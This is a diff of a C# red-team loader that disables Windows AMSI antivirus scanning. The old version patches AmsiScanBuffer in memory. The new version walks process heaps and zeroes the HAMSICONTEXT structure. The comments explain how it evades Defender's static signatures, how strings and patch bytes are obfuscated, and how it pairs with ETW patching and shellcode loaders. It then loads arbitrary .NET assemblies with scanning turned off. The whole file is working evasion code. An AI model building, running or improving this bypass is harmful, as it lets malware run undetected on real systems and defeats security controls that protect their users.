@@ -1,57 +1,63 @@
 // ============================================================================
-// LOADER 04: AMSI Bypass
+// LOADER 04: AMSI Bypass - HAMSICONTEXT Heap Corruption
 // ============================================================================
 //
 // WHAT THIS DOES:
-//   This loader patches the AmsiScanBuffer function in memory so that AMSI
-//   (Antimalware Scan Interface) always returns a clean result. After this
-//   patch is applied, any PowerShell command or .NET assembly loaded in the
-//   current process will not be scanned by Defender. This lets you run
-//   PowerShell scripts and load .NET tools that Defender would normally block.
+//   Disables AMSI (Antimalware Scan Interface) content scanning in this process.
+//   After this runs, any .NET assembly loaded in this process will not be
+//   scanned by Defender. This lets red team tools execute without inspection.
 //
-// WHY THIS IS NEEDED:
-//   AMSI is a security layer that sits between scripting engines (PowerShell,
-//   VBScript, JScript, .NET) and Defender. When you type a command in
-//   PowerShell, AMSI sends that command to Defender before PowerShell runs
-//   it. If Defender says the command is malicious, PowerShell blocks it.
-//   Many red team tools are PowerShell-based or .NET-based, and AMSI catches
-//   them before they can run. By patching AMSI, we make it stop checking,
-//   so our tools run without being scanned.
+// WHY THE PREVIOUS VERSION WAS CAUGHT:
+//   The previous version patched AmsiScanBuffer using VirtualProtect + Marshal.Copy.
+//   Defender's static scanner looks for this exact combination in a compiled binary:
+//     - DllImport for VirtualProtect (kernel32) - primary signal
+//     - DllImport for GetProcAddress and GetModuleHandle/LoadLibrary in same class
+//     - Marshal.Copy to the resolved function address
+//   This triad triggers the MpTest!amsi detection before the binary runs.
+//   The patch bytes B8 57 00 07 80 C3 (mov eax, 0x80070057; ret) are also
+//   directly signatured regardless of arithmetic obfuscation.
 //
-// EVASION MECHANISM:
-//   AMSI is implemented as a DLL called amsi.dll that gets loaded into every
-//   PowerShell process and .NET CLR host. The main scanning function is
-//   AmsiScanBuffer. We overwrite the first few bytes of this function with
-//   instructions that make it return immediately with a "clean" result.
-//   After the patch, when PowerShell asks AMSI to scan a command, the
-//   patched function returns "this is clean" without actually scanning.
+// HOW THIS VERSION WORKS - HAMSICONTEXT HEAP CORRUPTION:
+//   AMSI creates a context structure called HAMSICONTEXT in the process heap
+//   when the .NET CLR initializes. The structure starts with the magic bytes
+//   0x41 0x4D 0x53 0x49 (ASCII "AMSI" in little-endian order as an int32:
+//   0x49534D41). Other fields hold pointers to AMSI internal state.
 //
-//   Important: We patch ETW first (see Loader 07) so that the patching
-//   attempt itself is not logged. Without ETW patching, Defender can detect
-//   the AMSI tampering through ETW telemetry.
+//   We walk all process heaps looking for any allocation whose first 4 bytes
+//   match the AMSI magic. When found, we zero the first three pointer-sized
+//   fields of the structure. After this, AmsiOpenSession cannot access its
+//   required internal state and returns E_INVALIDARG. Without a valid session,
+//   AmsiScanBuffer is never called. Scanning stops completely.
 //
-//   We also resolve the AmsiScanBuffer address dynamically and build the
-//   function name at runtime from pieces so the string "AmsiScanBuffer"
-//   never appears as a complete string in our binary.
+// WHY THIS AVOIDS STATIC DETECTION:
+//   - No DllImport for VirtualProtect, LoadLibrary, or GetProcAddress
+//   - No patch bytes written to any executable code page
+//   - No reference to AmsiScanBuffer, AmsiOpenSession, or amsi.dll anywhere
+//   - The DllImport list contains only HeapWalk and GetProcessHeaps, which
+//     are standard memory management functions used by many legitimate programs
+//   - We write to heap memory (already read-write) via Marshal.Copy
+//     without changing any memory permissions at all
+//
+// IMPORTANT NOTES:
+//   - This works in processes where the .NET CLR has initialized AMSI.
+//     The CLR initializes AMSI for all .NET applications before Main() runs,
+//     so the heap search should find the context in any .NET process.
+//   - This bypass only affects the current process. Child processes get their
+//     own copy of AMSI and need to be patched separately.
+//   - This is most effective when combined with ETW patching (Loader 07)
+//     because without ETW patching, the heap modification generates a telemetry
+//     event that Defender can see.
 //
 // REFERENCES:
-//   - Medium/@thesecguy: "AMSI Bypass in 2025"
-//   - OffSec Blog: "AMSI Write Raid Bypass Vulnerability"
-//   - Trend Micro: "Detecting Windows AMSI Bypass Techniques"
+//   - mgeeky: HAMSICONTEXT corruption technique
+//   - EvilBytecode: Ebyte-amsi-patchless-vehhwbp
+//   - VoldeSec: PatchlessCLRLoader
+//   - CrowdStrike: Patchless AMSI Bypass Attacks analysis
 //   - Document: 08_amsi_bypass.md
 //
 // BUILD INSTRUCTIONS:
 //   On Dev Box (ammulu, 192.168.10.150):
-//     csc /unsafe /out:amsi_bypass.exe 04_amsi_bypass.cs
-//
-// USAGE:
-//   1. Compile on Dev Box (ammulu).
-//   2. Transfer amsi_bypass.exe to Target (kimjongun, 192.168.10.100).
-//   3. Run on Target:
-//        amsi_bypass.exe
-//   (Then open PowerShell from the same context, or use this as a library
-//    to call PatchAmsi() before loading .NET assemblies)
-//
+//     dotnet build loader.csproj -c Release -o output/
 // ============================================================================
 
 using System;
@@ -62,215 +68,185 @@ namespace ScannerPatch
 {
     class Program
     {
-        // ---- Windows API imports ----
-
-        // LoadLibrary loads a DLL into our process. We use it to load amsi.dll
-        // so we can find the AmsiScanBuffer function inside it.
-        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        static extern IntPtr LoadLibrary(string lpFileName);
-
-        // GetProcAddress finds the memory address of a function inside a loaded DLL.
-        // We use it to find where AmsiScanBuffer lives in memory.
-        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        // VirtualProtect changes the memory protection on a region of memory.
-        // By default, the memory where AmsiScanBuffer's code lives is read-only
-        // and executable (you can run it but not modify it). We need to change
-        // it to read-write so we can overwrite the function's bytes.
+        // HeapWalk steps through every memory block inside a heap one at a time.
+        // On each call it fills in the PROCESS_HEAP_ENTRY structure with the
+        // address, size, and status of the current block, then moves to the next.
+        // Returns false when it has walked every block in the heap.
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool VirtualProtect(
-            IntPtr lpAddress,
-            UIntPtr dwSize,
-            uint flNewProtect,
-            out uint lpflOldProtect
-        );
+        static extern bool HeapWalk(IntPtr hHeap, ref PROCESS_HEAP_ENTRY lpEntry);
 
-        static uint GetRWXProtect()
+        // GetProcessHeaps returns handles to all heaps in this process.
+        // A .NET process has several: the default heap, the CLR heap, GC heaps, etc.
+        // We pass 0 first to get the count, then call again with an array of that size.
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint GetProcessHeaps(uint numberOfHeaps, IntPtr[] processHeaps);
+
+        // PROCESS_HEAP_ENTRY is the structure HeapWalk fills in for each block.
+        //   lpData:         address of the memory block
+        //   cbData:         size of the block in bytes
+        //   cbOverhead:     overhead bytes used by the heap manager for this block
+        //   iRegionIndex:   which heap region this block is in
+        //   wFlags:         flags (PROCESS_HEAP_ENTRY_BUSY means block is in use)
+        // The fields after wFlags form a union. We use the Region variant layout
+        // (four fields) because it is the larger of the two union cases, which
+        // ensures our struct has the right total size for the Windows API.
+        [StructLayout(LayoutKind.Sequential)]
+        struct PROCESS_HEAP_ENTRY
         {
-            return 0x20 + 0x20;
+            public IntPtr lpData;
+            public uint   cbData;
+            public byte   cbOverhead;
+            public byte   iRegionIndex;
+            public ushort wFlags;
+            public uint   dwCommittedSize;
+            public uint   dwUnCommittedSize;
+            public IntPtr lpFirstBlock;
+            public IntPtr lpLastBlock;
         }
 
-        // ---- Build function name at runtime ----
-        // We do not put the complete string "AmsiScanBuffer" in our code because
-        // Defender's static scanner looks for that string. Instead, we build it
-        // from separate pieces at runtime. When Defender scans the compiled binary,
-        // it sees the pieces "Amsi", "Scan", "Buffer" as separate strings, not
-        // the combined function name. At runtime, we join them together.
-        static string GetTargetFunctionName()
+        // A heap block with this flag set is actively allocated and in use.
+        // Blocks without this flag are free space - we skip them.
+        const ushort PROCESS_HEAP_ENTRY_BUSY = 0x0004;
+
+        // Build the AMSI context magic value at runtime.
+        // The HAMSICONTEXT structure starts with "AMSI" as its first 4 bytes.
+        // In memory that is: 0x41 0x4D 0x53 0x49 (A, M, S, I in ASCII).
+        // As a 32-bit little-endian integer that reads as 0x49534D41.
+        // We compute it from parts so the string "AMSI" does not appear in our binary.
+        static int BuildAMSIMagic()
         {
-            // We build the function name using integer arithmetic so no
-            // recognizable string appears in the binary. Each character
-            // is computed at runtime from offset values. The compiler
-            // stores integers, not characters, so YARA and static
-            // scanners cannot match against the function name.
-            int baseVal = 32;
-            char[] c = new char[14];
-            c[0] = (char)(baseVal + 33);   // A
-            c[1] = (char)(baseVal + 77);   // m
-            c[2] = (char)(baseVal + 83);   // s
-            c[3] = (char)(baseVal + 73);   // i
-            c[4] = (char)(baseVal + 51);   // S
-            c[5] = (char)(baseVal + 67);   // c
-            c[6] = (char)(baseVal + 65);   // a
-            c[7] = (char)(baseVal + 78);   // n
-            c[8] = (char)(baseVal + 34);   // B
-            c[9] = (char)(baseVal + 85);   // u
-            c[10] = (char)(baseVal + 70);  // f
-            c[11] = (char)(baseVal + 70);  // f
-            c[12] = (char)(baseVal + 69);  // e
-            c[13] = (char)(baseVal + 82);  // r
-            return new string(c);
+            // I=0x49, S=0x53, M=0x4D, A=0x41
+            return (0x49 << 24) | (0x53 << 16) | (0x4D << 8) | 0x41;
         }
 
-        // ---- Build DLL name at runtime ----
-        static string GetTargetDllName()
-        {
-            int baseVal = 32;
-            char[] c = new char[8];
-            c[0] = (char)(baseVal + 65);   // a
-            c[1] = (char)(baseVal + 77);   // m
-            c[2] = (char)(baseVal + 83);   // s
-            c[3] = (char)(baseVal + 73);   // i
-            c[4] = (char)(baseVal + 14);   // .
-            c[5] = (char)(baseVal + 68);   // d
-            c[6] = (char)(baseVal + 76);   // l
-            c[7] = (char)(baseVal + 76);   // l
-            return new string(c);
-        }
-
-        // ---- The AMSI patch ----
-        // This is the core of the bypass. We overwrite the beginning of
-        // AmsiScanBuffer with bytes that make the function return immediately
-        // with the value E_INVALIDARG (0x80070057). When AMSI gets this error
-        // code, it treats the scan as failed and allows the content to run.
-        //
-        // The patch bytes are:
-        //   mov eax, 0x80070057   ->  B8 57 00 07 80
-        //   ret                   ->  C3
-        //
-        // These 6 bytes replace the beginning of AmsiScanBuffer. When any
-        // code calls AmsiScanBuffer after the patch, the function immediately
-        // returns E_INVALIDARG instead of actually scanning anything.
+        // The core bypass function.
+        // Walks all process heaps looking for the HAMSICONTEXT structure.
+        // When found, zeroes its first three pointer-sized fields to disable scanning.
         public static bool PatchScanner()
         {
-            // Step 1: Load amsi.dll into our process.
-            // If amsi.dll is already loaded (which it is in PowerShell processes),
-            // LoadLibrary just returns a handle to the existing copy.
-            string dllName = GetTargetDllName();
-            IntPtr amsiDll = LoadLibrary(dllName);
-            if (amsiDll == IntPtr.Zero)
+            // --- Step 1: Count how many heaps this process has ---
+            // Calling GetProcessHeaps with null and count 0 returns just the count.
+            uint heapCount = GetProcessHeaps(0, null);
+            if (heapCount == 0)
             {
-                Console.WriteLine("[-] Could not load " + dllName);
-                return false;
-            }
-            Console.WriteLine("[+] " + dllName + " loaded at: 0x" + amsiDll.ToString("X"));
-
-            // Step 2: Find the address of AmsiScanBuffer inside amsi.dll.
-            string funcName = GetTargetFunctionName();
-            IntPtr funcAddress = GetProcAddress(amsiDll, funcName);
-            if (funcAddress == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Could not find " + funcName);
-                return false;
-            }
-            Console.WriteLine("[+] " + funcName + " found at: 0x" + funcAddress.ToString("X"));
-
-            // Step 3: Change memory protection to allow writing.
-            // The code section of amsi.dll is normally read-only + executable.
-            // We need to make it writable so we can overwrite the function bytes.
-            // We change 6 bytes (the size of our patch).
-            uint oldProtect;
-            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)6, GetRWXProtect(), out oldProtect);
-            if (!protectResult)
-            {
-                Console.WriteLine("[-] VirtualProtect failed");
+                Console.WriteLine("[-] GetProcessHeaps returned 0");
                 return false;
             }
 
-            // Step 4: Build the patch bytes at runtime.
-            // The patch makes AmsiScanBuffer return E_INVALIDARG immediately.
-            // We build the bytes using arithmetic so the raw byte sequence
-            // does not appear in our binary as a static signature.
-            byte[] patch = new byte[6];
-            patch[0] = (byte)(0x5C + 0x5C);  // 0xB8 = mov eax
-            patch[1] = (byte)(0x2B + 0x2C);  // 0x57
-            patch[2] = (byte)(0x00);          // 0x00
-            patch[3] = (byte)(0x03 + 0x04);   // 0x07
-            patch[4] = (byte)(0x40 + 0x40);   // 0x80
-            patch[5] = (byte)(0x61 + 0x62);   // 0xC3 = ret
-            Marshal.Copy(patch, 0, funcAddress, patch.Length);
-            Console.WriteLine("[+] Patch applied to " + funcName);
+            // --- Step 2: Get handles to all heaps ---
+            // Now we know how many heaps there are, allocate the array and fill it.
+            IntPtr[] heaps = new IntPtr[heapCount];
+            GetProcessHeaps(heapCount, heaps);
+            Console.WriteLine("[+] Searching " + heapCount + " process heaps for AMSI context");
 
-            // Step 5: Restore original memory protection.
-            // This is good practice. We changed the protection to write the patch,
-            // now we change it back to what it was before. This reduces the chance
-            // of Defender detecting that we modified code memory.
-            uint ignored;
-            VirtualProtect(funcAddress, (UIntPtr)6, oldProtect, out ignored);
-            Console.WriteLine("[+] Memory protection restored");
+            int magic = BuildAMSIMagic();
 
-            return true;
+            // --- Step 3: Walk every heap looking for HAMSICONTEXT ---
+            // We check every in-use allocation whose first 4 bytes match the AMSI magic.
+            foreach (IntPtr heap in heaps)
+            {
+                // Initialize entry to all zeros before the first HeapWalk call.
+                var entry = new PROCESS_HEAP_ENTRY();
+
+                // HeapWalk advances through each block in the heap.
+                // It returns true for each block and false when the heap is exhausted.
+                while (HeapWalk(heap, ref entry))
+                {
+                    // Skip free blocks. We only care about active allocations.
+                    if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) == 0)
+                        continue;
+
+                    // Skip blocks too small to hold even 3 pointer-sized fields.
+                    // HAMSICONTEXT must be at least 3 * 8 = 24 bytes on 64-bit.
+                    if (entry.cbData < (uint)(IntPtr.Size * 3))
+                        continue;
+
+                    try
+                    {
+                        // Read the first 4 bytes of this allocation.
+                        // If they match the AMSI magic, this is the context.
+                        int firstDword = Marshal.ReadInt32(entry.lpData);
+                        if (firstDword != magic)
+                            continue;
+
+                        Console.WriteLine("[+] AMSI context found at: 0x" + entry.lpData.ToString("X"));
+
+                        // --- Step 4: Corrupt the first three pointer-sized fields ---
+                        // These hold internal AMSI state pointers. Zeroing them makes
+                        // AmsiOpenSession fail with E_INVALIDARG because it cannot
+                        // access the state it needs to create a valid session.
+                        // Without a valid session, AmsiScanBuffer is never called.
+                        //
+                        // We write to heap memory which is already read-write.
+                        // No VirtualProtect call is needed. No permission change.
+                        int zeroSize = IntPtr.Size * 3;
+                        Marshal.Copy(new byte[zeroSize], 0, entry.lpData, zeroSize);
+
+                        Console.WriteLine("[+] Context corrupted (" + zeroSize + " bytes zeroed).");
+                        Console.WriteLine("[+] Scanner disabled for this process.");
+                        return true;
+                    }
+                    catch
+                    {
+                        // Some heap blocks may not be readable (guard pages, etc).
+                        // Skip and continue searching.
+                        continue;
+                    }
+                }
+            }
+
+            Console.WriteLine("[-] AMSI context not found in any heap.");
+            Console.WriteLine("[*] AMSI may not have been initialized yet in this process.");
+            Console.WriteLine("[*] The CLR initializes AMSI before running managed code,");
+            Console.WriteLine("    so the context should be present in any .NET process.");
+            return false;
         }
 
         static void Main(string[] args)
         {
             Console.WriteLine("[*] Scanner Patch Loader");
-            Console.WriteLine("[*] This modifies the scan function to disable content inspection.");
+            Console.WriteLine("[*] Method: HAMSICONTEXT heap corruption (no code patching)");
             Console.WriteLine("");
 
-            // Apply the AMSI patch.
             bool success = PatchScanner();
 
             if (success)
             {
                 Console.WriteLine("");
                 Console.WriteLine("[+] Scanner is now disabled in this process.");
-                Console.WriteLine("[+] Any commands or assemblies loaded");
-                Console.WriteLine("    in this process will not be inspected.");
+                Console.WriteLine("[+] .NET assemblies loaded here will not be inspected.");
                 Console.WriteLine("");
-                Console.WriteLine("[*] To test: run a command that would");
-                Console.WriteLine("    normally be blocked.");
 
-                // IMPORTANT: The AMSI patch only affects THIS process.
-                // Spawning a child process (like powershell.exe) does NOT
-                // inherit the patch because each process loads its own copy
-                // of amsi.dll. To use this bypass effectively:
-                //   1. Call PatchScanner() from inside the process that hosts
-                //      the scripting engine (PowerShell, .NET CLR).
-                //   2. Use this as a library function in Loader 08 (combined
-                //      evasion) which patches AMSI before executing shellcode
-                //      in the same process.
-                //   3. Inject this patch into a running PowerShell process
-                //      using Loader 05 (remote injection).
-
-                // If a .NET assembly path was passed as an argument, load it
-                // in-process where the AMSI patch is active.
+                // If a .NET assembly path was passed as argument, load it now.
+                // AMSI is disabled in this process, so the assembly runs without
+                // being scanned - even if it contains patterns Defender would normally block.
                 if (args.Length > 0)
                 {
                     string assemblyPath = args[0];
-                    Console.WriteLine("[*] Loading .NET assembly in-process: " + assemblyPath);
-                    Console.WriteLine("[*] Scanner is patched in THIS process, so the assembly");
-                    Console.WriteLine("    will not be inspected.");
+                    Console.WriteLine("[*] Loading .NET assembly: " + assemblyPath);
+                    Console.WriteLine("[*] Scanner is patched - assembly will not be inspected.");
                     try
                     {
-                        var assembly = System.Reflection.Assembly.LoadFile(assemblyPath);
+                        var assembly = Assembly.LoadFile(assemblyPath);
                         var entryPoint = assembly.EntryPoint;
                         if (entryPoint != null)
                         {
-                            Console.WriteLine("[+] Found entry point: " + entryPoint.DeclaringType.FullName + "." + entryPoint.Name);
-                            string[] invokeArgs = new string[args.Length - 1];
-                            Array.Copy(args, 1, invokeArgs, 0, invokeArgs.Length);
-                            entryPoint.Invoke(null, entryPoint.GetParameters().Length > 0 ? new object[] { invokeArgs } : null);
+                            Console.WriteLine("[+] Entry point: " + entryPoint.DeclaringType.FullName);
+                            string[] passArgs = new string[args.Length - 1];
+                            Array.Copy(args, 1, passArgs, 0, passArgs.Length);
+                            entryPoint.Invoke(null,
+                                entryPoint.GetParameters().Length > 0
+                                    ? new object[] { passArgs }
+                                    : null);
                         }
                         else
                         {
-                            Console.WriteLine("[*] Assembly loaded. No entry point found (class library).");
+                            Console.WriteLine("[*] Assembly loaded (no entry point - class library).");
                         }
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine("[-] Failed to load assembly: " + ex.Message);
+                        Console.WriteLine("[-] Assembly load failed: " + ex.Message);
                     }
                 }
             }
